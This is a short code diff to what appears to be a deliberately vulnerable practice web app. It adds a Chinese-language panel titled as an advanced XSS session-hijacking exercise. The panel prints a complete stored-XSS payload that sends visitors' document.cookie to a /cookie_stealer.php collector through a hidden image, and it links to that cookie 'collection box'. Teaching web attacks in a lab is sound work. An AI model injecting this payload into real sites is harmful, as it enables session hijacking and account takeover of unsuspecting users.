@@ -95,6 +95,18 @@ try {
                         </form>
                     </div>
                 </div>
+
+                <div class="card shadow-sm border-warning mt-3">
+                    <div class="card-header bg-warning text-dark font-weight-bold">
+                        💡 XSS 進階演練：會話劫持
+                    </div>
+                    <div class="card-body">
+                        <p class="small text-muted">試著在留言內容中注入以下惡意腳本，竊取所有造訪該頁面之使用者的 Session Cookie：</p>
+                        <pre class="bg-light p-2 small border rounded" style="white-space: pre-wrap; word-break: break-all;">&lt;script&gt;document.write('&lt;img src="/cookie_stealer.php?cookie=' + encodeURIComponent(document.cookie) + '" style="display:none;"&gt;')&lt;/script&gt;</pre>
+                        <p class="small text-muted">當其他使用者造訪本頁時，其 Session ID 將會被自動傳送至下方收集箱：</p>
+                        <a href="/cookie_stealer.php" target="_blank" class="btn btn-sm btn-outline-danger btn-block font-weight-bold">📋 開啟 Cookie 收集箱 ➔</a>
+                    </div>
+                </div>
             </div>
 
             <!-- 歷史留言列表 -->
